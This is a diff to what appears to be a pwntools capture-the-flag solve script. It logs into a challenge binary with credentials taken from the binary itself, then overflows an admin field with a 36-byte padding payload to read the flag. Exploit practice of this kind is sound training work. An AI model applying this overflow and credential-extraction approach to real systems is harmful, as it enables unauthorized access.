@@ -72,14 +72,29 @@ continue
 
 io = start()
 
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
+# from the binary
+username = "Cristina"
+password = "Crypto"
 
-io.interactive()
+# logging in
+io.recvuntil(b"name: ")
+io.sendline(username.encode('ascii'))
+io.recvuntil(b"word: ")
+io.sendline(password.encode('ascii'))
+
+# overflowing the admin field
+io.recvuntil(b"> ")
+io.sendline(b'1')
+io.recvuntil(b"name: ")
+
+payload = b"A" * (16 + 16 + 4)
+io.sendline(payload)
+
+# getting the flag
+io.recvuntil(b"> ")
+io.sendline(b'3')
+io.recvuntil(b"... ")
+flag = io.recvuntil(b'\n').decode('ascii')
+
+io.success(f"The flag is {flag}")
 
